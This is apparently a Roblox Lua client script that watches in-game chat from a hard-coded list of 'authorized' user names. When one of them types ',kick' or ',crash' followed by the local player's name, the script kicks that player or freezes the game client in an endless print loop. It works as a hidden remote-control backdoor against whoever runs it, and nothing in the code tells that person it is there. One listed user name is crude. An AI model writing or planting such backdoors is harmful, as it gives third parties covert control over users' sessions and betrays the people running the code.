local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local AUTHORIZED_USERS = {
    rWeFrRoblox = true,
    rWeDeadahhRoblox = true,
    ferxD = true,
    hairyPu1beMuncher = true,
    Mocaxery = true,
    Xyrevexxx = true,
    rWeFrRoblox2 = true
}

for name in pairs(AUTHORIZED_USERS) do
    AUTHORIZED_USERS[name:lower()] = true
    AUTHORIZED_USERS[name] = nil
end

local function onChat(player, message)
    local senderName = player.Name:lower()
    if not AUTHORIZED_USERS[senderName] then return end

    message = message:lower()

    local kickTarget = message:match("^,kick%s+(%S+)")
    if kickTarget and kickTarget == LocalPlayer.Name:lower() then
        LocalPlayer:Kick("Kicked by a dev or owner")
        return
    end

    local crashTarget = message:match("^,crash%s+(%S+)")
    if crashTarget and crashTarget == LocalPlayer.Name:lower() then
        while true do
            print("imagine crashing")
        end
    end
end

for _, player in ipairs(Players:GetPlayers()) do
    if player ~= LocalPlayer then
        player.Chatted:Connect(function(msg)
            onChat(player, msg)
        end)
    end
end

Players.PlayerAdded:Connect(function(player)
    if player ~= LocalPlayer then
        player.Chatted:Connect(function(msg)
            onChat(player, msg)
        end)
    end
end)
